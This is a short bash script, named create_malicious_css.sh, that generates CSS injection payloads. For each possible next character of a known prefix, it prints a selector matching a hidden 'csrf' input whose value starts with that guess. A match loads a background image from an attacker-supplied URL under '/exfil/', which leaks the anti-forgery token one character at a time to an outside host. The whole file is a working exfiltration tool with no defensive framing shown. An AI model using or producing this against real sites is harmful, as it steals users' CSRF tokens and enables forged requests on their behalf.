#!/bin/bash

if [[ $# -ne 2 ]]; then
    echo "usage: ./create_malicious_css.sh [ATTACKER_URL] [PREFIX]"
    exit 92
fi

ATTACKER_URL=$1

PREFIX=$2

CHARACTERS="azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789_-éàèùç€£?,;:!?./§$éè&=+<>~#*%\"'{}()[]|\\/^@"

for (( i=0; i<${#CHARACTERS}; i++ )); do
    C="${CHARACTERS:$i:1}" #get character
    TEXT=$PREFIX$C
    MSG="input[name=csrf][value^=\"$TEXT\"]{
        background-image: url($ATTACKER_URL/exfil/$TEXT);
    }"
    echo $MSG
done